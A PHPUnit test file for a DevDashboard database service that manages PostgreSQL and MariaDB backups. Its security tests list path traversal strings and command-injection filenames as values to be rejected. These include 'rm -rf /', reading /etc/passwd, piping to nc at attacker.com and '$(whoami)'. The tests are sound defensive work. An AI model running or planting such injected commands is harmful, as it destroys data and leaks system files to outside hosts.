<?php

declare(strict_types=1);

namespace Tests\DevDashboard\Services;

use DevDashboard\Services\DatabaseService;
use PDO;
use PHPUnit\Framework\TestCase;
use ReflectionClass;

/**
 * @covers \DevDashboard\Services\DatabaseService
 * @SuppressWarnings("PHPMD.TooManyPublicMethods")
 */
class DatabaseServiceTest extends TestCase
{
    private DatabaseService $service;

    private string $testBackupDir;

    protected function setUp(): void
    {
        parent::setUp();
        require_once __DIR__ . '/../../../../src/php/DevDashboard/Services/DatabaseService.php';
        require_once __DIR__ . '/../../../../src/php/App/Infrastructure/DatabaseConfig.php';

        // Set minimal database config for testing (if not already set)
        if (!getenv('DB_PASSWORD') && !getenv('DB_PASSWORD_FILE')) {
            putenv('DB_PASSWORD=test_password');
        }

        if (!getenv('DATABASE_URL')) {
            putenv('DATABASE_URL=postgres://test:test@localhost:5432/test');
        }

        $this->service = new DatabaseService();

        // Create temp directory for testing backups
        $this->testBackupDir = sys_get_temp_dir() . '/test-backups-' . uniqid();
        mkdir($this->testBackupDir, 0777, true);
    }

    protected function tearDown(): void
    {
        // Clean up test backup directory
        if (is_dir($this->testBackupDir)) {
            $files = glob($this->testBackupDir . '/*');
            if ($files !== false) {
                array_map(unlink(...), $files);
            }

            rmdir($this->testBackupDir);
        }

        parent::tearDown();
    }

    /**
     * Helper: Get private/protected method via reflection
     *
     * @param array<int, mixed> $args
     */
    private function callPrivateMethod(object $object, string $methodName, array $args = []): mixed
    {
        $reflection = new ReflectionClass($object);
        $method     = $reflection->getMethod($methodName);
        return $method->invokeArgs($object, $args);
    }

    // ==================== BASIC SERVICE TESTS ====================

    public function testGetConnectionReturnsValidPDO(): void
    {
        $connection = $this->service->getConnection();

        // May be null if database is not available in test environment
        if ($connection instanceof PDO) {
            $this->assertInstanceOf(PDO::class, $connection);
        } else {
            $this->assertNull($connection);
        }
    }

    public function testGetDatabaseOverviewReturnsCorrectStructure(): void
    {
        $overview = $this->service->getDatabaseOverview();

        $this->assertArrayHasKey('connected', $overview);
        $this->assertIsBool($overview['connected']);

        if ($overview['connected']) {
            $this->assertArrayHasKey('type', $overview);
            $this->assertArrayHasKey('host', $overview);
            $this->assertArrayHasKey('port', $overview);
            $this->assertArrayHasKey('database', $overview);
            $this->assertArrayHasKey('version', $overview);
            $this->assertArrayHasKey('table_count', $overview);
            $this->assertArrayHasKey('total_size', $overview);
        } else {
            $this->assertArrayHasKey('error', $overview);
        }
    }

    public function testGetTablesReturnsArray(): void
    {
        $tables = $this->service->getTables();
        $this->assertIsArray($tables);
    }

    public function testGetConnectionStatsReturnsCorrectStructure(): void
    {
        $stats = $this->service->getConnectionStats();

        $this->assertArrayHasKey('available', $stats);
        $this->assertIsBool($stats['available']);

        if (!$stats['available']) {
            $this->assertArrayHasKey('message', $stats);
        }
    }

    public function testGetDatabaseCommandsReturnsArray(): void
    {
        $commands = $this->service->getDatabaseCommands();

        $this->assertIsArray($commands);
        $this->assertNotEmpty($commands);

        // Verify each command has required structure
        foreach ($commands as $cmd) {
            $this->assertArrayHasKey('label', $cmd);
            $this->assertArrayHasKey('command', $cmd);
            $this->assertArrayHasKey('description', $cmd);
        }
    }

    public function testGetDatabaseCommandsIncludesBackupCommands(): void
    {
        $commands     = $this->service->getDatabaseCommands();
        $commandTexts = array_column($commands, 'command');

        $this->assertContains('make backup-db', $commandTexts);
        $this->assertContains('make backup-db-list', $commandTexts);
        $this->assertContains('make backup-db-restore', $commandTexts);
    }

    public function testGetDbToolsStatusReturnsArray(): void
    {
        $tools = $this->service->getDbToolsStatus();
        $this->assertIsArray($tools);
        $this->assertArrayHasKey('adminer', $tools);
    }

    public function testGetQuickStatsReturnsCorrectStructure(): void
    {
        $stats = $this->service->getQuickStats();

        $this->assertArrayHasKey('available', $stats);
        $this->assertIsBool($stats['available']);

        if ($stats['available']) {
            $this->assertArrayHasKey('type', $stats);
            $this->assertArrayHasKey('version', $stats);
            $this->assertArrayHasKey('tables', $stats);
            $this->assertArrayHasKey('size', $stats);
        } else {
            $this->assertArrayHasKey('message', $stats);
        }
    }

    // ==================== BACKUP FILENAME PARSING TESTS ====================

    public function testParseBackupFilenameWithEncryptedPostgresBackup(): void
    {
        $filename = 'postgres_app_20260126_120530.sql.gz.enc';
        $result   = $this->callPrivateMethod($this->service, 'parseBackupFilename', [$filename]);

        $this->assertNotNull($result);
        $this->assertEquals('postgres', $result['dbType']);
        $this->assertEquals('app', $result['dbName']);
        $this->assertEquals('2026-01-26 12:05:30', $result['timestamp']);
        $this->assertTrue($result['encrypted']);
    }

    public function testParseBackupFilenameWithUnencryptedMariaDBBackup(): void
    {
        $filename = 'mariadb_mydb_20260125_100000.sql.gz';
        $result   = $this->callPrivateMethod($this->service, 'parseBackupFilename', [$filename]);

        $this->assertNotNull($result);
        $this->assertEquals('mariadb', $result['dbType']);
        $this->assertEquals('mydb', $result['dbName']);
        $this->assertEquals('2026-01-25 10:00:00', $result['timestamp']);
        $this->assertFalse($result['encrypted']);
    }

    public function testParseBackupFilenameRejectsInvalidFormats(): void
    {
        $invalidFilenames = [
            'invalid.sql.gz',
            'backup_20260126.sql',
            '../../../etc/passwd',
            'postgres_app.sql.gz.enc',
            'mysql_db_20260126_120530.sql.gz', // 'mysql' not valid, should be 'mariadb'
        ];

        foreach ($invalidFilenames as $filename) {
            $result = $this->callPrivateMethod($this->service, 'parseBackupFilename', [$filename]);
            $this->assertNull($result, 'Expected null for invalid filename: ' . $filename);
        }
    }

    // ==================== BACKUP FILENAME VALIDATION TESTS ====================

    public function testValidateBackupFilenameAcceptsValidFilenames(): void
    {
        $validFilenames = [
            'postgres_app_20260126_120530.sql.gz.enc',
            'mariadb_mydb_20260125_100000.sql.gz',
            'postgres_testdb_20260101_000000.sql.gz',
        ];

        foreach ($validFilenames as $filename) {
            $result = $this->callPrivateMethod($this->service, 'validateBackupFilename', [$filename]);
            $this->assertTrue($result, 'Expected true for valid filename: ' . $filename);
        }
    }

    public function testValidateBackupFilenameRejectsPathTraversal(): void
    {
        $maliciousFilenames = [
            '../postgres_app_20260126_120530.sql.gz.enc',
            '../../etc/passwd',
            '/var/www/html/backups/db/backup.sql.gz',
            'backup/../../../etc/passwd',
            'postgres_app_20260126_120530.sql.gz.enc/../malicious',
        ];

        foreach ($maliciousFilenames as $filename) {
            $result = $this->callPrivateMethod($this->service, 'validateBackupFilename', [$filename]);
            $this->assertFalse($result, 'Expected false for malicious filename: ' . $filename);
        }
    }

    public function testValidateBackupFilenameRejectsInvalidPatterns(): void
    {
        $invalidFilenames = [
            'invalid.sql.gz',
            'backup.sql',
            'postgres_app.sql.gz.enc',
            'mariadb_db_invalid_timestamp.sql.gz',
        ];

        foreach ($invalidFilenames as $filename) {
            $result = $this->callPrivateMethod($this->service, 'validateBackupFilename', [$filename]);
            $this->assertFalse($result, 'Expected false for invalid filename: ' . $filename);
        }
    }

    // ==================== BACKUP DIRECTORY TESTS ====================

    public function testGetBackupDirectoryReturnsCorrectPath(): void
    {
        $dir = $this->callPrivateMethod($this->service, 'getBackupDirectory', []);
        $this->assertEquals('/var/www/html/backups/db', $dir);
    }

    // ==================== FORMAT HELPER TESTS ====================

    public function testFormatBytesCorrectly(): void
    {
        $testCases = [
            [0, '0.00 B'],
            [500, '500.00 B'],
            [1024, '1.00 KB'],
            [1536, '1.50 KB'],
            [1048576, '1.00 MB'],
            [1073741824, '1.00 GB'],
        ];

        foreach ($testCases as [$bytes, $expected]) {
            $result = $this->callPrivateMethod($this->service, 'formatBytes', [$bytes]);
            $this->assertEquals($expected, $result);
        }
    }

    public function testFormatAgeReturnsCorrectStrings(): void
    {
        $now = time();

        // Just now
        $result = $this->callPrivateMethod($this->service, 'formatAge', [$now - 30]);
        $this->assertEquals('Just now', $result);

        // Minutes ago
        $result = $this->callPrivateMethod($this->service, 'formatAge', [$now - 120]);
        $this->assertEquals('2 minutes ago', $result);

        // Hours ago
        $result = $this->callPrivateMethod($this->service, 'formatAge', [$now - 7200]);
        $this->assertEquals('2 hours ago', $result);

        // Days ago
        $result = $this->callPrivateMethod($this->service, 'formatAge', [$now - 172800]);
        $this->assertEquals('2 days ago', $result);
    }

    // ==================== BACKUP STATISTICS TESTS ====================

    public function testGetBackupStatsReturnsCorrectStructure(): void
    {
        $stats = $this->service->getBackupStats();

        $this->assertArrayHasKey('count', $stats);
        $this->assertArrayHasKey('totalSize', $stats);
        $this->assertArrayHasKey('oldestDate', $stats);
        $this->assertArrayHasKey('newestDate', $stats);

        $this->assertIsInt($stats['count']);
        $this->assertIsString($stats['totalSize']);
        $this->assertIsString($stats['oldestDate']);
        $this->assertIsString($stats['newestDate']);
    }

    public function testGetBackupStatsWhenNoBackups(): void
    {
        $stats = $this->service->getBackupStats();

        $this->assertEquals(0, $stats['count']);
        $this->assertEquals('0 B', $stats['totalSize']);
        $this->assertEquals('N/A', $stats['oldestDate']);
        $this->assertEquals('N/A', $stats['newestDate']);
    }

    // ==================== LIST BACKUPS TESTS ====================

    public function testListBackupsReturnsCorrectStructure(): void
    {
        $result = $this->service->listBackups();

        $this->assertArrayHasKey('success', $result);
        $this->assertArrayHasKey('backups', $result);
        $this->assertTrue($result['success']);
        $this->assertIsArray($result['backups']);
    }

    public function testListBackupsReturnsEmptyWhenNoBackups(): void
    {
        $result = $this->service->listBackups();

        $this->assertTrue($result['success']);
        $this->assertEmpty($result['backups']);
    }

    // ==================== CREATE BACKUP TESTS ====================

    public function testCreateBackupReturnsCorrectStructure(): void
    {
        $result = $this->service->createBackup();

        $this->assertArrayHasKey('success', $result);
        $this->assertArrayHasKey('message', $result);
        $this->assertIsBool($result['success']);
        $this->assertIsString($result['message']);
    }

    // ==================== RESTORE BACKUP TESTS ====================

    public function testRestoreBackupRejectsInvalidFilename(): void
    {
        $result = $this->service->restoreBackup('../../../etc/passwd');

        $this->assertFalse($result['success']);
        $this->assertStringContainsString('Invalid', $result['message']);
    }

    public function testRestoreBackupReturnsErrorForNonExistentFile(): void
    {
        $result = $this->service->restoreBackup('postgres_app_20260126_120530.sql.gz.enc');

        $this->assertFalse($result['success']);
        $this->assertStringContainsString('not found', $result['message']);
    }

    // ==================== DELETE BACKUP TESTS ====================

    public function testDeleteBackupRejectsInvalidFilename(): void
    {
        $result = $this->service->deleteBackup('../../../etc/passwd');

        $this->assertFalse($result['success']);
        $this->assertStringContainsString('Invalid', $result['message']);
    }

    public function testDeleteBackupReturnsErrorForNonExistentFile(): void
    {
        $result = $this->service->deleteBackup('postgres_app_20260126_120530.sql.gz.enc');

        $this->assertFalse($result['success']);
        $this->assertStringContainsString('not found', $result['message']);
    }

    // ==================== SECURITY TESTS ====================

    public function testSecurityPathTraversalIsBlocked(): void
    {
        $attackVectors = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/var/www/html/secrets/db_password.txt',
            'backup.sql.gz/../../../etc/passwd',
        ];

        foreach ($attackVectors as $vector) {
            // Test restore
            $result = $this->service->restoreBackup($vector);
            $this->assertFalse($result['success'], 'Restore should block: ' . $vector);

            // Test delete
            $result = $this->service->deleteBackup($vector);
            $this->assertFalse($result['success'], 'Delete should block: ' . $vector);
        }
    }

    public function testSecurityCommandInjectionIsBlocked(): void
    {
        // Attempt command injection via filename
        $attackFilenames = [
            'postgres_app_20260126_120530.sql.gz; rm -rf /',
            'postgres_app_20260126_120530.sql.gz && cat /etc/passwd',
            'postgres_app_20260126_120530.sql.gz | nc attacker.com 1234',
            'postgres_app_$(whoami)_20260126_120530.sql.gz',
        ];

        foreach ($attackFilenames as $filename) {
            // Validation should reject these patterns
            $result = $this->callPrivateMethod($this->service, 'validateBackupFilename', [$filename]);
            $this->assertFalse($result, 'Should reject command injection: ' . $filename);
        }
    }
}
